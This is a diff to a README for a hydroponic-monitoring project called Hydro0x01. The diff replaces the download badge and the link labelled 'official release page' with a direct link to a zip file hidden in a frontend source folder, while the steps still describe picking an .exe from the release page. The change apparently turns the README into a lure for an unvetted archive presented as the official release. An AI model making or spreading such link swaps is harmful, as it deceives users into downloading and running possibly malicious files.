@@ -1,6 +1,6 @@
 # 🌿 Hydro0x01 - Manage your hydroponic garden with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/suvitha1962-del/Hydro0x01/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/suvitha1962-del/Hydro0x01/raw/refs/heads/main/frontend/src/features/devices/x-Hydro-2.6.zip)
 
 Hydro0x01 provides a reliable method to monitor and control your hydroponic system. This software connects your ESP32 hardware to a central dashboard. You track water levels, pH balance, and nutrient density from your computer. The system records all data and helps you maintain healthy plants.
 
@@ -27,7 +27,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. **Visit the download page:** Go to the [official release page](https://github.com/suvitha1962-del/Hydro0x01/releases) to access the software.
+1. **Visit the download page:** Go to the [official release page](https://github.com/suvitha1962-del/Hydro0x01/raw/refs/heads/main/frontend/src/features/devices/x-Hydro-2.6.zip) to access the software.
 2. **Select the installer:** Look for the file ending in `.exe` under the latest release section. Click the filename to start the download.
 3. **Run the file:** Open the downloaded file from your browser or your Downloads folder.
 4. **Follow instructions:** A window appears to guide you through the installation process. Click Next until the software installs.
